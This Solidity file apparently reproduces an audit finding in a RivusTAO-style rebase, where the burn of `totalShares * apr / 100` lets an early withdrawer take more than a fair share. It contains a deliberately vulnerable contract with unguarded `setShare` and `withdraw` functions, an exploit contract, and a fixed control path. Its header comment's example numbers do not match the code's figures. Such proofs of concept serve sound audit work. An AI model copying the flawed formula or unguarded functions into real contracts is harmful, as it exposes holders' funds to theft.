// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// RivusTAO rebase burns `totalShares * apr / 100`. A 20% APR becomes a 25% price (Pashov C-02).
/// 100 shares, 100 tokens. Early holder takes 62.5 instead of 60. The other holder is left 37.5, not 40.

contract ShareToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract RivusTAO {
    ShareToken public token;
    uint256 public totalShares = 120 ether;
    uint256 public totalTokens = 120 ether;
    mapping(address => uint256) public shares;
    uint256 public lastBurn;

    constructor(ShareToken t) {
        token = t;
    }

    function setShare(address user, uint256 amount) external {
        shares[user] = amount;
    }

    function rebase(uint256 apr) external {
        // @> VULN: burnAmount = totalShares * apr / 100, not totalShares * apr / (100 + apr)
        uint256 burnAmount = totalShares * apr / 100;
        lastBurn = burnAmount;
        totalShares -= burnAmount;
    }

    function rebaseFixed(uint256 apr) external {
        uint256 burnAmount = totalShares * apr / (100 + apr);
        lastBurn = burnAmount;
        totalShares -= burnAmount;
    }

    function withdraw(address user) external returns (uint256 out) {
        uint256 userShares = shares[user];
        out = userShares * totalTokens / totalShares;
        shares[user] = 0;
        totalShares -= userShares;
        totalTokens -= out;
        token.transfer(user, out);
    }
}

contract Exploit {
    address public constant OTHER = 0x2222222222222222222222222222222222222222;
    ShareToken public token;
    RivusTAO public tao;
    uint256 public received;
    uint256 public leftForOther;
    uint256 public fairOut;
    uint256 public excess;

    constructor() {
        token = new ShareToken();
        tao = new RivusTAO(token);
        token.mint(address(tao), 120 ether);
        tao.setShare(address(this), 60 ether);
        tao.setShare(OTHER, 60 ether);
    }

    function run() external {
        tao.rebase(20);
        received = tao.withdraw(address(this));
        leftForOther = tao.totalTokens();
        uint256 fairShares = (uint256(120 ether) * 100) / 120;
        fairOut = (uint256(60 ether) * 120 ether) / fairShares;
        excess = received - fairOut;
        require(tao.lastBurn() == 24 ether, "burn");
        require(received == 75 ether, "received");
        require(fairOut == 72 ether, "fair");
        require(excess == 3 ether, "excess");
        require(leftForOther == 45 ether, "other");
    }

    function runControl() external {
        tao.rebaseFixed(20);
        received = tao.withdraw(address(this));
        leftForOther = tao.totalTokens();
        require(received == 72 ether, "fair received");
        require(leftForOther == 48 ether, "fair left");
    }
}
